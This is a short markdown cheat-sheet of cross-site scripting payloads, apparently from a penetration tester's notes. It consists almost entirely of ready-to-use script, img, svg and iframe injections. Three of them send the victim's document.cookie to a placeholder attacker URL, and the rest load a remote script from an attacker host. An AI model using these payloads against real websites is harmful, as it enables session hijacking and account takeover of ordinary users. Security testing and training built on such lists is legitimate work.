# HTML Attributes

Search Tag(s): #helpers #xss

- A list of payloads to inject links

```
<script>new Image().src="http[s]://<attacker_URL>/cookies.php?cookie="+document.cookie;</script>
<script>document.location="http[s]://<attacker_URL>/cookies.php?cookie="+document.cookie</script>
<script>window.location="http[s]://<attacker_URL>/cookies.php?cookie="+document.cookie</script>

<script src="http[s]://<attacker_URL>/script.js"></script>
<img src="http[s]://<attacker_URL>/script.js">
<svg src="http[s]://<attacker_URL>/script.js">
<iframe src="http[s]://<attacker_URL>/script.js">
```